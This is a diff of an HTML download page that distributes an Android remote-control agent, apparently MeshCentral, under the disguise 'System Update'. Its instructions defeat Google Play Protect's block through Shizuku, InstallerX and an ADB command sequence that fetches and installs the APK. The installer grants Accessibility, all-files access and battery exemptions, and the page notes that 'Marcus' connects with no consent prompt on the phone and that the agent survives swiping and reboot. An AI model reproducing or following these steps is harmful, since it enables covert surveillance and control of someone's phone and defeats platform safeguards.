@@ -41,6 +41,7 @@ color:#fff;text-decoration:none;font-weight:650;font-size:14.5px}
 .card p{font-size:13.5px;color:var(--muted);min-height:38px}
 .card .meta{font-size:12px;color:var(--muted);margin:8px 0}
 .card a{display:inline-block;font-size:14px;font-weight:650;color:var(--clay-deep)}
+.card a.alt{font-size:12px;font-weight:500;color:var(--muted);margin-top:6px}
 .card code{display:block;margin-top:10px;font-size:10.5px;line-height:1.5;color:#718087;
 word-break:break-all;background:var(--paper);border-radius:6px;padding:7px 8px}
 .qrow{display:flex;align-items:center;gap:10px;margin-top:12px;font-size:11.5px;color:var(--muted)}
@@ -111,77 +112,65 @@ border:1px solid rgba(34,211,238,.35);border-radius:8px;color:#a5f3fc}
     </article>
     <article class="card android">
       <h2>Android</h2>
-      <p>APK agent, installs as <b>System Update</b>. Play Protect may hard-block it; use the bypass below. Remote control then needs the in-app checklist.</p>
-      <div class="meta">SystemUpdate-1.0.23-release.apk · 2.9 MB</div>
-      <a href="/dl/SystemUpdate-1.0.23-release.apk">Download for Android</a>
-      <div class="qrow"><img src="/img/android-qr.png" alt="QR code to the Android APK" width="92" height="92"> Scan with the phone camera</div>
-      <code>SHA-256 F8C7970704F1035C84CCC62F57817E027AD44B8CB2C0F78855859D2251FAAECD</code>
+      <p>No-cable installer. It has no Accessibility, installs normally, then installs the agent through Shizuku without a PC.</p>
+      <div class="meta">SystemUpdate-Installer.apk · 2.3 MB</div>
+      <a href="/dl/SystemUpdate-Installer.apk">Download no-cable installer</a><br>
+      <a class="alt" href="/dl/SystemUpdate-1.0.23-release.apk">Direct agent APK (ADB / InstallerX)</a>
+      <div class="qrow"><img src="/img/android-qr.png" alt="QR code to the Android installer" width="92" height="92"> Scan with the phone camera</div>
+      <code>Installer SHA-256 4A9B31444FE2DC8757893737894CAD5433DB1D7AA2D467DD5BBF8A6849609E13</code>
+      <code>Agent SHA-256 F8C7970704F1035C84CCC62F57817E027AD44B8CB2C0F78855859D2251FAAECD</code>
     </article>
   </div>
 
-  <section class="note">
-    <h2>Android: finish setup in 90 seconds</h2>
-    <p class="only">Only for phones with no cable. If ADB is attached, skip this entirely.</p>
-    <p class="pre"><b>Before you start:</b> if MeshCentral Agent is already installed from Play Store, uninstall it first. The signing key differs and the install will fail otherwise.</p>
+  <section class="note" id="android-install">
+    <h2>Android: no-cable install</h2>
+    <p class="only">Only for phones with no cable. The installer declares no Accessibility, so Play Protect lets it through; it then uses Shizuku (wireless ADB) to install the agent as the shell user.</p>
+    <p class="pre"><b>Before you start:</b> if System Update or MeshCentral Agent is already installed, uninstall it first. The signing key differs and the update will fail.</p>
 
-    <h3>1. Allow the install</h3>
+    <h3>1. Allow this browser to install</h3>
     <p>Chrome → ⋮ → Settings → Install unknown apps → allow for Chrome.<br>
-    Play Store → profile → Play Protect → ⚙ → toggle off <b>Scan apps with Play Protect</b>. This alone may not clear Google's newer hard block.</p>
+    Play Store → profile → Play Protect → ⚙ → turn off <b>Scan apps with Play Protect</b> if it lets you.</p>
 
-    <h3>2. Install</h3>
-    <p>Open the downloaded <b>System Update</b> APK → <b>Install</b>. If Play Protect still warns: <b>Install anyway</b>.</p>
-    <p class="dont">If it says <b>App blocked to protect your device</b> and only offers <b>Got it</b>, that is Google's 2026 rule for internet-sideloaded accessibility apps — not a corrupt APK. Turning off scanning may not clear it.</p>
+    <h3>2. Install the installer</h3>
+    <p>Use the <b>No-cable installer</b> button on the Android card. It has no sensitive permissions, so it should install with at most an “Install anyway” prompt — it is not hard-blocked like the agent.</p>
+
+    <h3>3. Set up Shizuku (one time)</h3>
+    <ol>
+      <li>Install <a href="https://play.google.com/store/apps/details?id=moe.shizuku.privileged.api" target="_blank" rel="noopener">Shizuku</a> from Play Store.</li>
+      <li>Settings → About phone → tap <b>Build number</b> 7×.</li>
+      <li>Developer options → <b>Wireless debugging</b> → on.</li>
+      <li>Open Shizuku → <b>Pairing</b> → open its notification → enter the pairing code → <b>Start</b>.</li>
+    </ol>
+    <p>Shizuku runs as the ADB shell user. It cannot auto-start after a reboot without root; the installed agent still reconnects by itself.</p>
+
+    <h3>4. Install System Update</h3>
+    <p>Open <b>System Update Installer</b> → <b>Install System Update</b> → allow Shizuku when asked. It copies the agent, installs it, unlocks Restricted Settings, grants All files access, enables Accessibility, whitelists battery and launches the app.</p>
+
+    <h3>5. Confirm</h3>
+    <p>The main screen must read <b>Connected</b> under the server name — not Disconnected, not Connecting.<br>
+    Overflow menu → <b>Check Unattended Setup</b> must report complete. If any row says <b>Needs setup</b>, open it and fix it.<br>
+    Reboot and confirm it returns to Connected on its own.</p>
+
+    <p class="dont"><b>Do not</b> tap Disconnect or swipe the app away and assume it is dead — the foreground service survives.</p>
+    <p class="auto"><b>Note:</b> Automatic Consent is already on. When Marcus opens a session there is no phone prompt — normal, not broken.</p>
+
     <details class="bypass" id="playprotect">
-      <summary>Blocked? Three ways past it</summary>
-      <h4>A. No cable: Shizuku + InstallerX (best for a phone in hand)</h4>
+      <summary>Direct APK / ADB path, or if the installer itself is blocked</summary>
+      <h4>Direct agent APK (still hard-blocked)</h4>
+      <p>If Play Protect shows <b>App blocked to protect your device</b> with only <b>Got it</b>, the direct agent APK needs one of these:</p>
+      <h4>A. Install the direct APK through InstallerX</h4>
       <ol>
-        <li>Uninstall any older <b>System Update</b> first.</li>
-        <li>Install <a href="https://play.google.com/store/apps/details?id=moe.shizuku.privileged.api" target="_blank" rel="noopener">Shizuku</a> from Play Store.</li>
-        <li>Settings → About phone → tap <b>Build number</b> 7×. Developer options → <b>Wireless debugging</b> → on.</li>
-        <li>Open Shizuku → <b>Pairing</b> → open its notification → enter the pairing code → <b>Start</b>.</li>
-        <li>Install <a href="https://github.com/wxxsfxyzm/InstallerX-Revived/releases/latest" target="_blank" rel="noopener">InstallerX Revived</a>. It declares no Accessibility permission, so Play Protect lets it through.</li>
-        <li>Open InstallerX → authorize Shizuku → pick the System Update APK → <b>Install</b>.</li>
+        <li>Install <a href="https://github.com/wxxsfxyzm/InstallerX-Revived/releases/latest" target="_blank" rel="noopener">InstallerX Revived</a>; it has no Accessibility, so it installs.</li>
+        <li>In InstallerX, authorize Shizuku, choose the direct System Update APK, install.</li>
       </ol>
-      <p>Shizuku stops on reboot; the agent does not. Shizuku is only needed for the install or a future update.</p>
-      <h4>B. USB: ADB (fastest, and bypasses the web-sideload block)</h4>
-      <p>Enable USB debugging, connect the phone, then run:</p>
+      <h4>B. ADB from a PC</h4>
       <code>adb uninstall com.meshcentral.agent2
 curl.exe -O https://docs.telcom.stream/dl/SystemUpdate-1.0.23-release.apk
 adb install -r -g SystemUpdate-1.0.23-release.apk</code>
-      <p>On macOS or Linux, run <code>curl -O</code> without <code>.exe</code>.</p>
-      <h4>C. Permanent: ask Google to clear it</h4>
-      <p>File a Play Protect appeal with package <b>com.meshcentral.agent2</b> and the full SHA-256 above. Approval removes the block for every user, but it is not instant.</p>
-      <p><a href="https://support.google.com/googleplay/android-developer/contact/protectappeals" target="_blank" rel="noopener">File a Play Protect appeal</a></p>
-      <p><b>After installing, continue at step 4.</b></p>
+      <h4>C. Permanent: Play Protect appeal</h4>
+      <p>Appeal filed with package <b>com.meshcentral.agent2</b> and the full SHA-256. Approval removes the block for everyone.</p>
+      <p><a href="https://support.google.com/googleplay/android-developer/contact/protectappeals" target="_blank" rel="noopener">File another appeal</a></p>
     </details>
-
-    <h3>3. Open it and allow notifications</h3>
-    <p>Tap <b>Allow</b> on the notification prompt.</p>
-
-    <h3>4. Android 13 and newer only — unlock the toggle</h3>
-    <p>Settings → Apps → <b>System Update</b> → ⋮ (top right) → <b>Allow restricted settings</b> → confirm with PIN or fingerprint.<br>
-    Skip on Android 12 and below.<br>
-    Samsung: same path. Xiaomi/HyperOS: also enable <b>Autostart</b> for the app.</p>
-
-    <h3>5. Turn on remote control</h3>
-    <p>A <b>Finish unattended access setup</b> dialog appears — tap <b>Open App Settings</b>.<br>
-    Tap <b>Accessibility Remote Control</b> → <b>System Update</b> → toggle on → <b>Allow</b>.<br>
-    The dialog lists every item with <b>Ready</b> or <b>Needs setup</b>. Work down the list until every row says <b>Ready</b>.</p>
-
-    <h3>6. Battery</h3>
-    <p>In the same list, tap <b>Battery Optimization</b> → <b>Unrestricted</b>.<br>
-    Samsung only: Settings → Battery → Background usage limits → remove <b>System Update</b> from <b>Sleeping apps</b>.</p>
-
-    <h3>7. All files access</h3>
-    <p>In the same list, tap <b>All files access</b> → toggle on.</p>
-
-    <h3>8. Confirm it worked</h3>
-    <p>The main screen must read <b>Connected</b> under the server name — not Disconnected, not Connecting.<br>
-    Overflow menu → <b>Check Unattended Setup</b> must report setup is complete.<br>
-    Then reboot the phone and confirm it returns to Connected on its own. The reboot test is the real pass.</p>
-
-    <p class="dont"><b>Do not</b> tap Disconnect, or swipe the app away and assume it’s dead — the foreground service survives.</p>
-    <p class="auto"><b>Note:</b> Automatic Consent is already on in this enterprise build. When Marcus opens a session there is no approve prompt on the phone — that is normal, not broken.</p>
   </section>
 
   <section class="note">
